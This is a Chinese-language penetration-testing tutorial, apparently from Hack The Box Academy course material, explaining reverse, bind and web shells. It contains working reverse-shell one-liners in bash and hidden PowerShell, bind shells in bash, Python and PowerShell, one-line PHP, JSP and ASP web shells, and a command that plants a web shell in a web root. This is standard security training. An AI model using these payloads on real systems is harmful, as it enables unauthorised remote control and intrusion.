---
title: Shell 的种类 Type of Shell
---
# 终端（shell）的类型

一旦我们入侵了一个系统并利用漏洞来远程执行命令，通常我们需要一种方法来与该系统进行通信，以避免每次都要利用同一个漏洞来执行每个命令。为了对远程系统进行详细的枚举、进一步控制系统或其网络，我们需要一个可靠的连接，直接访问系统的shell，例如`Bash`或`PowerShell`，以便我们可以彻底调查远程系统并进行下一步操作。

连接到已入侵系统的一种方法是通过网络协议，例如Linux的`SSH`或Windows的`WinRM`，它们允许我们远程登录到已入侵系统。但是，除非我们获得了有效的登录凭据，否则在执行远程系统上的命令以首先获得对这些服务的访问权限之前，我们将无法利用这些方法。

访问已入侵主机进行控制和远程代码执行的另一种方法是使用shell。正如之前讨论的那样，有三种主要类型的shell：反向shell（Reverse Shell）、绑定shell（Bind Shell）和Web shell。这些shell的每种都有一种不同的与我们通信的方法，用于接受和执行我们的命令。

|   |   |
|---|---|
|Shell类型|通信方法|
|`反向shell（Reverse Shell）`|回连到我们的系统，并通过反向连接使我们控制远程连接。|
|`绑定shell（Bind Shell）`|等待我们连接，并在我们连接后使我们控制连接。|
|`Web shell`|通过Web服务器进行通信，通过HTTP参数接受我们的命令，执行命令，并将输出打印回来。|

让我们更深入地了解上述每种shell，并通过示例逐一介绍。

## 反向shell（Reverse Shell）

`反向shell（Reverse Shell）`是最常见的一种shell类型，因为它是获得对已入侵主机控制的最快捷和最简单的方法。一旦我们在远程主机上发现了允许远程代码执行的漏洞，我们可以在我们的机器上启动一个`netcat`监听器，它在特定端口（例如端口`1234`）上监听。有了这个监听器，我们可以执行一个`反向shell命令`，它将远程系统的shell（如`Bash`或`PowerShell`）连接到我们的`netcat`监听器上，从而实现反向连接。

#### Netcat监听器

第一步是在我们选择的端口上启动一个`netcat`监听器：

Netcat监听器

```Plaintext
jw0610a@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

我们使用的标志是：

|   |   |
|---|---|
|标志|描述|
|`-l`|监听模式，等待连接连接到我们。|
|`-v`|详细模式，以便我们知道何时接收到连接。|
|`-n`|禁用DNS解析，并仅通过IP连接，以加快连接速度。|
|`-p 1234`|`netcat`监听的端口号，并应该发送反向连接到该端口。|

现在，我们有一个`netcat`监听器在等待连接，我们可以执行连接回连的反向shell命令。

#### 回连IP

然而，在此之前，我们需要找到我们的系统的IP地址，以便将反向连接发送回我们的机器。我们可以使用以下命令找到我们的IP地址：

回连IP

```Plaintext
jw0610a@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

在我们的示例中，我们感兴趣的IP地址位于`tun0`下，这是我们通过VPN连接到的同一HTB网络。

注意：我们连接到'tun0'上的IP地址，因为我们只能通过VPN连接到HackTheBox主机，它们无法通过Internet连接到我们，因此无法使用`eth0`通过Internet连接到我们。在实际的渗透测试中，您可能直接连接到相同的网络，或执行外部渗透测试，因此可能会通过`eth0`适配器或类似的方式进行连接。

#### 反向shell命令

我们执行的命令取决于被入侵主机运行的操作系统，即Linux还是Windows，以及我们可以访问的应用程序和命令。[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)页面上列出了我们可以使用的一系列反向shell命令，涵盖了各种选项，取决于我们入侵的主机。

某些反向shell命令比其他命令更可靠，并且通常可以尝试进行反向连接。以下是我们可以使用的可靠命令，用于在Linux受到入侵的主机上获取反向连接的`bash`，以及在Windows受到入侵的主机上获取反向连接的`Powershell`：

代码：bash

```Plaintext
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

代码：bash

```Plaintext
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

代码：powershell

```Plaintext
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$$stream = $$client.GetStream();[byte[]]$$bytes = 0..65535|%{0};while(($$i = $$stream.Read($$bytes, 0, $$bytes.Length)) -ne 0){;$$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($$bytes,0, $$i);$$sendback = (iex $$data 2>&1 | Out-String );$$sendback2 = $$sendback + "PS " + (pwd).Path + "> ";$$sendbyte = ([text.encoding]::ASCII).GetBytes($$sendback2);$$stream.Write($$sendbyte,0,$$sendbyte.Length);$$stream.Flush()};$client.Close()
```

我们可以利用我们对远程主机的利用来执行上述命令之一，例如通过Python漏洞或Metasploit模块，以获得反向连接。一旦连接成功，我们应该在我们的`netcat`监听器上收到连接：

反向shell命令

```Plaintext
jw0610a@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

正如我们所看到的，在我们的`netcat`监听器上收到连接后，我们可以输入我们的命令，并直接在我们的机器上获得其输出。

反向shell非常方便，当我们想要快速获得对已入侵主机的可靠连接时。然而，反向shell非常脆弱。一旦反向shell命令停止，或者由于任何原因失去连接，我们将不得不再次使用初始利用来执行反向shell命令，以恢复访问。

## 绑定shell（Bind Shell）

另一种类型的shell是`绑定shell（Bind Shell）`。与连接到我们的反向shell不同，我们将不得不连接到绑定shell的`目标`监听端口上。

一旦我们执行`绑定shell命令`，它将在远程主机上的一个端口上开始监听，并将该主机的shell（如`Bash`或`PowerShell`）绑定到该端口上。我们需要使用`netcat`连接到该端口，并通过该shell获得控制。

#### 绑定shell命令

我们可以再次利用[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)找到一个适合的命令来启动我们的绑定shell。

注意：我们将在远程主机上启动一个监听连接，监听端口为'1234'，IP为'0.0.0.0'，以便我们可以从任何地方连接。

以下是我们可以使用的可

靠命令来启动绑定shell：

```Bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```Python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

---

#### Netcat连接

一旦我们执行绑定shell命令，我们应该在指定的端口上有一个等待我们连接的shell。我们现在可以连接到它。

我们可以使用`netcat`连接到该端口，并获得对shell的连接：

Netcat连接

```Plaintext
jw0610a@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

正如我们所看到的，我们直接进入一个bash会话，可以直接与目标系统交互。与反向shell不同，如果由于任何原因我们断开与绑定shell的连接，我们可以重新连接并立即获得另一个连接。但是，如果绑定shell命令由于任何原因停止，或者远程主机重新启动，我们仍将失去对远程主机的访问，必须重新利用它来恢复访问。

#### 升级TTY

一旦我们通过Netcat连接到shell，我们会注意到我们只能输入命令或退格，但无法将文本光标左右移动以编辑命令，也无法上下移动以访问命令历史记录。为了能够做到这一点，我们需要升级我们的TTY。这可以通过将我们的终端TTY与远程TTY映射来实现。

有多种方法可以做到这一点。对于我们的

目的，我们将使用`python/stty`方法。在我们的`netcat` shell中，我们将使用以下命令使用python将我们的shell升级为完整的TTY：

升级TTY

```Plaintext
jw0610a@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

在我们运行此命令后，我们将按下`ctrl+z`将我们的shell放到后台，并返回到我们的本地终端，在其中输入以下`stty`命令：

升级TTY

```Plaintext
www-data@remotehost$ ^Z

jw0610a@htb[/htb]$ stty raw -echo
jw0610a@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

一旦我们按下`fg`，它将把我们的`netcat` shell带回前台。此时，终端将显示一个空白行。我们可以再次按下`enter`回到我们的shell，或者输入`reset`并按下`enter`将其带回。此时，我们将拥有一个完全工作的TTY shell，具备命令历史记录和其他功能，就像SSH连接一样。

#### 升级TTY

我们可能会注意到我们的shell没有覆盖整个终端。为了解决这个问题，我们需要找出一些变量。我们可以在我们的系统上打开另一个终端窗口，将窗口最大化或使用任何我们想要的大小，然后输入以下命令来获取我们的变量：

升级TTY

```Plaintext
jw0610a@htb[/htb]$ echo $TERM

xterm-256color
```

升级TTY

```Plaintext
jw0610a@htb[/htb]$ stty size

67 318
```

第一个命令显示了`TERM`变量，第二个命令显示了`行数`和`列数`的值。现在，我们拥有了我们的变量，我们可以回到我们的`netcat` shell，并使用以下命令来修复它们：

升级TTY

```Plaintext
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

完成这些操作后，我们应该拥有一个使用终端的所有功能的`netcat` shell，就像SSH连接一样。

## Web shell

我们的最后一种shell类型是`Web shell`。`Web shell`通常是一个网络脚本，例如`PHP`或`ASPX`，它通过HTTP请求参数（如`GET`或`POST`请求参数）接受我们的命令，执行该命令，并将输出打印在网页上。

#### 编写Web shell

首先，我们需要编写我们的Web shell，它将通过`GET`请求接受我们的命令，并执行该命令并将其输出打印出来。Web shell脚本通常是一行代码非常简短，可以轻松记忆。以下是一些常见的常

见Web语言的短网页shell脚本：

代码：php

```PHP
<?php system($_REQUEST["cmd"]); ?>
```

代码：jsp

```Java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

代码：asp

```JavaScript
<% eval request("cmd") %>
```

---

#### 上传Web shell

一旦我们有了我们的Web shell，我们需要将我们的Web shell脚本放入远程主机的Web目录（Web根目录）中，以便通过Web浏览器执行该脚本。这可以通过漏洞上传功能来实现，这将允许我们将其中一个shell写入文件中，例如`shell.php`并将其上传，然后访问我们上传的文件以执行命令。

但是，如果我们只能通过利用进行远程命令执行，我们可以将我们的shell直接写入Web根目录以进行访问。因此，第一步是确定Web根目录的位置。以下是常见Web服务器的默认Web根目录：

|   |   |
|---|---|
|Web服务器|默认Web根目录|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

我们可以检查这些目录来确定使用的Web根目录，然后使用`echo`将我们的Web shell写入。例如，如果我们攻击运行Apache的Linux主机，我们可以使用以下命令编写一个`PHP` shell：

代码：bash

```Plaintext
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

#### 访问Web shell

一旦我们编写了我们的Web shell，我们可以通过浏览器或使用`cURL`访问它。我们可以在被入侵的网站上访问`shell.php`页面，并使用`?cmd=id`来执行`id`命令：

http://SERVER_IP:PORT/shell.php?cmd=id

![](https://gwmah9jwtul.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Q4MzMyZjg1ZjUzMTM5ODlhN2M1NTZhY2Y0ZTg0YWFfNWdPTjJjMHF3MHVzM09Wa0NOMlAzZW03SXhSRjRKWlpfVG9rZW46QXlmV2Iwalp4b2JHd2J4WnVTV2NOdnRDbnRmXzE2ODY0OTYxMzY6MTY4NjQ5OTczNl9WNA)

另一个选项是使用`cURL`：访问Web shell

```Plaintext
jw0610a@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

正如我们所看到的，我们可以不断更改命令以获取其输出。Web shell的一个很大的优点是，它可以绕过任何防火墙限制，因为它不会在一个端口上打开新连接，而是在Web端口上运行（如`80`或`443`），或者Web应用程序所使用的任何端口。另一个很大的优点是，如果被入侵的主机重新启动，Web shell仍将保留，我们可以访问它并在不再利用远程主机的情况下进行命令执行。

另一方面，Web shell不像反向和绑定shell那样交互，因为我们必须不断请求不同的

URL来执行我们的命令。不过，在极端情况下，我们可以编写一个`Python`脚本来自动化此过程，并在我们的终端中提供一个半交互式的Web shell。